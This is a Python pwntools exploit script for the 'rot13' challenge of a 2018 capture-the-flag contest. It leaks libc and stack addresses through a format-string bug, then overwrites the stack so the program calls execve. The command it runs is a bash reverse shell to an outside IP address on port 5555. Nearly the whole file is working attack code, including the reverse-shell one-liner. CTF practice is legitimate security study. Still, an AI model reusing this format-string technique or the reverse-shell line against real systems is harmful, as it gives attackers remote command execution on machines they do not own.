#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2018 hzshang <hzshang15@gmail.com>

from pwn import *
context.log_level="debug"
os.environ["LD_LIBRARY_PATH"]="./"
pwn_file="./rot13"
elf=ELF(pwn_file)
libc_address=0
stack_address=0
libc=ELF("./libc.so.6")
if len(sys.argv)==1:
    conn=process(pwn_file)
    pid=conn.pid
else:
    context.proxy=(socks.SOCKS5, '10.211.55.2', 1080)
    conn=remote("chal1.sunshinectf.org",20006)
    # conn=remote("127.1",4444)
    pid=0

def debug():
    log.debug("libc address: 0x%x"%libc_address)
    log.debug("stack address: 0x%x"%stack_address)
    log.debug("process pid:%d"%pid)
    pause()

def send_enc(s):
    conn.sendline(dec(s))    
    conn.recvuntil("Rot13 encrypted data: ")
    return conn.recvline(keepends=False)

def dec(s):
    ret=[]
    for i in s:
        if i.isalpha():
            if i.islower():
                ret.append(chr((ord(i)-13-ord('a'))%26+ord('a')))
            else:
                ret.append(chr((ord(i)-13-ord('A'))%26+ord('A')))
        else:
            ret.append(i)
    return "".join(ret)


libc_address=int(send_enc("0x%2$x"),16)-0x25325
stack_address=int(send_enc("0x%14$x"),16)-0x1e8


write1={
    stack_address+4:libc_address+libc.symbols["execve"],
    stack_address+0xc:stack_address+0x50,
    stack_address+0x10:stack_address+0x18, # *argv[]
    stack_address+0x14:0,
    stack_address+0x18:stack_address+0x50,
    stack_address+0x1c:stack_address+0x5c,
    stack_address+0x20:stack_address+0x60,
    stack_address+0x24:0,
}

write2={
    # /bin/bash  stack_address+0x1c
    stack_address+0x50:u32("/bin"),
    stack_address+0x54:u32("/bas"),
    stack_address+0x58:u32("h\x00\x00\x00"),
    # -c
    stack_address+0x5c:u32("-c\x00\x00"),
}

shell="/bin/bash -i >& /dev/tcp/45.76.48.85/5555 0>&1"


def align(s):
    return s.ljust(len(s)/4*4+4,"\x00")

shell=align(shell)
write3={}
for i in range(0,len(shell),4):
    write3[stack_address+0x60+i]=u32(shell[i:i+4])


p1=fmtstr_payload(7,write1)
p2=fmtstr_payload(7,write2)
p3=fmtstr_payload(7,write3)
send_enc(p1)
send_enc(p2)
send_enc(p3)
debug()
conn.shutdown("send")
print conn.recv()
